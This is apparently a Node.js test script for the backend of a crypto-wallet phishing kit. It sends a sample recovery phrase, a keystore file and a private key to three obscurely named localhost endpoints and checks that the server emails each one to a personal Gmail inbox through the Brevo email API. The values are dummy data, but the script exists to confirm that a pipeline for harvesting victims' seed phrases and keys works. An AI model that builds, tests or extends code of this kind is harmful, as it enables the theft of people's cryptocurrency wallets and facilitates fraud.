const fetch = require('node-fetch');

// Test data for different endpoints
const testData = {
    recoveryPhrase: "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
    keystoreJson: '{"version":3,"id":"12345678-1234-1234-1234-123456789012","address":"0x1234567890123456789012345678901234567890","crypto":{"ciphertext":"test","cipherparams":{"iv":"test"},"cipher":"aes-128-ctr","kdf":"scrypt","kdfparams":{"dklen":32,"salt":"test","n":262144,"r":8,"p":1},"mac":"test"}}',
    privateKey: "0x1234567890123456789012345678901234567890123456789012345678901234"
};

// Test endpoints
const endpoints = [
    { url: 'http://localhost:5000/processing', data: testData.recoveryPhrase, name: 'Recovery Phrase' },
    { url: 'http://localhost:5000/processingb', data: testData.keystoreJson, name: 'Keystore JSON' },
    { url: 'http://localhost:5000/processingc', data: testData.privateKey, name: 'Private Key' }
];

async function testEmailEndpoint(endpoint) {
    console.log(`\n🧪 Testing ${endpoint.name} endpoint...`);
    console.log(`📤 Sending data: ${endpoint.data.substring(0, 50)}...`);
    
    try {
        const response = await fetch(endpoint.url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                inputvalue: endpoint.data
            })
        });

        const result = await response.json();
        
        if (response.ok) {
            console.log(`✅ ${endpoint.name} test PASSED`);
            console.log(`📧 Response:`, result);
        } else {
            console.log(`❌ ${endpoint.name} test FAILED`);
            console.log(`🚨 Error:`, result);
        }
        
    } catch (error) {
        console.log(`❌ ${endpoint.name} test FAILED with exception`);
        console.log(`🚨 Exception:`, error.message);
    }
}

async function runAllTests() {
    console.log('🚀 Starting Email Functionality Tests');
    console.log('=====================================');
    console.log('⚠️  Make sure your server is running on port 5000');
    console.log('⚠️  Make sure you have BREVO_API_KEY in your .env file');
    console.log('=====================================\n');

    for (const endpoint of endpoints) {
        await testEmailEndpoint(endpoint);
        // Wait 2 seconds between tests to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 2000));
    }

    console.log('\n🏁 All tests completed!');
    console.log('\n📋 Next steps:');
    console.log('1. Check your email inbox at victoremmy1876@gmail.com');
    console.log('2. Check server console for detailed logs');
    console.log('3. If tests fail, verify your BREVO_API_KEY is correct');
}

// Run the tests
runAllTests().catch(console.error);
